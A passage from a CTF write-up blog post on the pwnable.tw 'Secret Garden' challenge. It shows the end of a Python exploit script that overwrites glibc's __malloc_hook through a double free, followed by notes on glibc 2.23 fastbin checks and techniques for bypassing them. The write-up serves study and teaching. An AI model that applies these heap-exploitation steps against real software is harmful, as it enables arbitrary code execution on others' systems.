the one gadgets to crash.</span></pre></td></tr><tr><td data-num="74"></td><td><pre>    <span class="token comment"># An alternative way is to trigger __malloc_hook via malloc_printerr().</span></pre></td></tr><tr><td data-num="75"></td><td><pre>    <span class="token comment"># To do this, we can trigger a "double free or corruption (fasttop)".</span></pre></td></tr><tr><td data-num="76"></td><td><pre>    chall<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span>  <span class="token comment"># prepare a chunk for (fasttop) error</span></pre></td></tr><tr><td data-num="77"></td><td><pre>    chall<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">19</span> <span class="token operator">*</span> <span class="token string">b'A'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># overwrite __malloc_hook</span></pre></td></tr><tr><td data-num="78"></td><td><pre>    chall<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="79"></td><td><pre>    chall<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="80"></td><td><pre></pre></td></tr><tr><td data-num="81"></td><td><pre>    proc<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="82"></td><td><pre></pre></td></tr><tr><td data-num="83"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="84"></td><td><pre>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h1 id="fastbin-related-error-handling"><a class="markdownIt-Anchor" href="#fastbin-related-error-handling">#</a> Fastbin-Related Error Handling</h1>
+<h2 id="check-1-double-free-or-corruption-fasttop"><a class="markdownIt-Anchor" href="#check-1-double-free-or-corruption-fasttop">#</a> Check 1: double free or corruption (fasttop)</h2>
+<p>In glibc 2.23,  <code>_int_free()</code>  will refuse to free the given pointer  <code>p</code>  when the first chunk in fastbin is  <code>p</code> .</p>
+<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">/* Check that the top of the bin is not the record we are going to add</pre></td></tr><tr><td data-num="2"></td><td><pre>   (i.e., double free).  */</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span>old <span class="token operator">==</span> p<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	errstr <span class="token operator">=</span> <span class="token string">"double free or corruption (fasttop)"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">goto</span> errout<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>Source: <span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vZ2xpYmMvZ2xpYmMtMi4yMy9zb3VyY2UvbWFsbG9jL21hbGxvYy5jI0wzOTM3">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3937</span></p>
+<p>To bypass this restriction, a commonly used technique is:</p>
+<ul>
+<li>free(A)</li>
+<li>free(B)</li>
+<li>free(A)</li>
+</ul>
+<h2 id="check-2-malloc-memory-corruption-fast"><a class="markdownIt-Anchor" href="#check-2-malloc-memory-corruption-fast">#</a> Check 2: malloc(): memory corruption (fast)</h2>
+<p>In glibc 2.23,  <code>_int_malloc()</code>  will refuse to return a freed chunk from a fastbin if that chunk has incorrect size.</p>
+<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span><span class="token punctuation">(</span><span class="token function">fastbin_index</span><span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>	errstr <span class="token operator">=</span> <span class="token string">"malloc(): memory corruption (fast)"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>errout<span class="token operator">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	<span class="token function">malloc_printerr</span><span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> errstr<span class="token punctuation">,</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>Source: <span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vZ2xpYmMvZ2xpYmMtMi4yMy9zb3VyY2UvbWFsbG9jL21hbGxvYy5jI0wzMzg1">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3385</span></p>
+<p>To bypass this restriction, the freed chunk’s  <code>size</code>  field (right before  <code>fd</code> ) must be set to the correct size. A commonly used technique is to:</p>
+<ul>
+<li>Look for the byte pattern  <code>7f 00 00 00 00 00 00 00</code>  in memory, and use it as the  <code>size</code>  field.</li>
+<li>Go back 8 bytes to obtain the base address of the chunk.</li>
+<li>Place this chunk into a fastbin, either by free()ing it or fastbin dup.</li>
+</ul>
+
+      <div class="tags">
+          <a href="/tags/linux/" rel="tag"><i class="ic i-tag"></i> linux</a>
+          <a href="/tags/ctf/" rel="tag"><i class="ic i-tag"></i> ctf</a>
+          <a href="/tags/binary-exploitation/" rel="tag"><i class="ic i-tag"></i> binary-exploitation</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2022-08-28 00:53:00" itemprop="dateModified" datetime="2022-08-28T00:53:00+08:00">2022-08-28</time>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>aesophor <i class="ic i-at"><em>@</em></i>
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="https://aesophor.github.io/2022/08/27/pwnable-tw-secret-garden/" title="[pwnable.tw] Secret Garden (350 pts)">https://aesophor.github.io/2022/08/27/pwnable-tw-secret-garden/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2020/07/20/Arch-Linux-on-MacBook-Pro-11-2-with-Custom-NVMe-M-2-SSD/" itemprop="url" rel="prev" data-background-image="&#x2F;2020&#x2F;07&#x2F;20&#x2F;Arch-Linux-on-MacBook-Pro-11-2-with-Custom-NVMe-M-2-SSD&#x2F;banner.jpg" title="Arch Linux on MacBook Pro 11,2 with Custom NVMe M.2 SSD">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> Linux</span>
+  <h3>Arch Linux on MacBook Pro 11,2 with Custom NVMe M.2 SSD</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#introduction"><span class="toc-number">1.</span> <span class="toc-text"> Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#analysis"><span class="toc-number">2.</span> <span class="toc-text"> Analysis</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#preparation"><span class="toc-number">3.</span> <span class="toc-text"> Preparation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnerability"><span class="toc-number">4.</span> <span class="toc-text"> Vulnerability</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exploitation"><span class="toc-number">5.</span> <span class="toc-text"> Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#leaking-libc-base"><span class="toc-number">5.1.</span> <span class="toc-text"> Leaking libc base</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overwriting-__malloc_hooklibc-via-fastbin-dup"><span class="toc-number">5.2.</span> <span class="toc-text"> Overwriting __malloc_hook@libc via fastbin dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#triggering-our-__malloc_hook"><span class="toc-number">5.3.</span> <span class="toc-text"> Triggering our __malloc_hook</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#full-exploit-script"><span class="toc-number">6.</span> <span class="toc-text"> Full Exploit Script</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fastbin-related-error-handling"><span class="toc-number">7.</span> <span class="toc-text"> Fastbin-Related Error Handling</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#check-1-double-free-or-corruption-fasttop"><span class="toc-number">7.1.</span> <span class="toc-text"> Check 1: double free or corruption (fasttop)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#check-2-malloc-memory-corruption-fast"><span class="toc-number">7.2.</span> <span class="toc-text"> Check 2: malloc(): memory corruption (fast)</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li class="active"><a href="/2022/08/27/pwnable-tw-secret-garden/" rel="bookmark" title="[pwnable.tw] Secret Garden (350 pts)">[pwnable.tw] Secret Garden (350 pts)</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="aesophor"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">aesophor</p>
+  <div class="description" itemprop="description">{software,reverse} engineer</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">2</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">2</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">3</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Flc29waG9y" title="https:&#x2F;&#x2F;github.com&#x2F;aesophor"><i class="ic i-github"></i></span>
+      <span class="exturl item instagram" data-url="aHR0cHM6Ly9pbnN0YWdyYW0uY29tL2Flc29waG9yLmNj" title="https:&#x2F;&#x2F;instagram.com&#x2F;aesophor.cc"><i class="ic i-instagram"></i></span>
+      <a href="https://aesophor.github.io/about" title="https:&#x2F;&#x2F;aesophor.github.io&#x2F;about" class="item about"><i class="ic i-address-card"></i></a>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>About</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>Posts</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>Archives</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>Categories</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>Tags</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="In CTF">CTF</a>
+</div>
+
+    <span><a href="/2022/08/27/pwnable-tw-secret-garden/" title="[pwnable.tw] Secret Garden (350 pts)">[pwnable.tw] Secret Garden (350 pts)</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Linux/" title="In Linux">Linux</a>
+</div>
+
+    <span><a href="/2020/07/20/Arch-Linux-on-MacBook-Pro-11-2-with-Custom-NVMe-M-2-SSD/" title="Arch Linux on MacBook Pro 11,2 with Custom NVMe M.2 SSD">Arch Linux on MacBook Pro 11,2 with Custom NVMe M.2 SSD</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">aesophor @ aesophor</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/08/27/pwnable-tw-secret-garden/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
